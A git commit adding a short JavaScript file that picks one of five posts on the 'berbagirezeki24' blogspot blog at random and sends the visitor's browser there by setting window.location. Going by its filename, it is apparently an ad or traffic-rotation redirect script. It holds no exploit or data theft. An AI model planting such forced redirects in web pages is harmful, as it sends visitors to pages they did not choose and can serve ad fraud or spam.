e0d061e5cda6ad8faff723242de93ea54bcaaa5b
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2024-03-15 10:09:42 +0700

    Create ads2dr5redibloggaa.js

---
+++ ads2dr5redibloggaa.js
@@ -0,0 +1,15 @@
+var dataUrl = [
+  
+  'https://berbagirezeki24.blogspot.com/2024/03/berbagi-rezeki_22.html',
+
+  'https://berbagirezeki24.blogspot.com/2024/03/berbagi-rezeki_65.html',
+
+  'https://berbagirezeki24.blogspot.com/2024/03/berbagi-rezeki_95.html',
+
+  'https://berbagirezeki24.blogspot.com/2024/03/berbagi-rezeki_14.html',
+
+  'https://berbagirezeki24.blogspot.com/2024/03/berbagi-rezeki.html'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
